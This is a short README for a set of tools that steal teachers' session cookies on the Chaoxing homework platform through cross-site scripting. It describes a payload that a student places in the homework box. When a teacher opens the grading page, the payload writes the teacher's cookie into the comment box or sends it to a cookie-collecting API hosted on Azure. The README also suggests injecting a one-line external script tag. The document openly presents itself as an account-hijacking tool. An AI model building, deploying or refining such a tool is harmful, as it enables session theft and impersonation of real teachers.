## Doc

### ver 1.0
    a set of js injection tools for steal account cookies of chaoxing platform

- ### ChaoXingAPI
    a restful api for teacher cookies

    models compoents:

        name[string]

        cookie[string]

        time[string]

    already configered for publishing to azure

    ### `remember to set the CSOR policy in app service setting`

- ### payloads.js
    The js code to inject in the homework box in submit page and it will execute when teacher open the homework checking page.
    It will dump the cookie in two ways

    - inject the cookie in text form as html comment in the teacher comment box.
    So the cookie can be lookup in the teacher comment box. [ implemented in stt function ]

    - the second function disabled by default.
    To enable it,modify the server url and uncomment the line that execute the function. [ implemented in sendInfoToServer function ]


- RoadMap
    - improve the inmemory database to delete the expired cookie automatically.
    - add admin page for managering cookie itemes stored on server better.
    - embed js code into api project itself.


- Tips
  
  Js code can be hosted on server and inject one line of code below to simplify the process.
  - ```<script src="https://www.***.***/***.js"></script>```
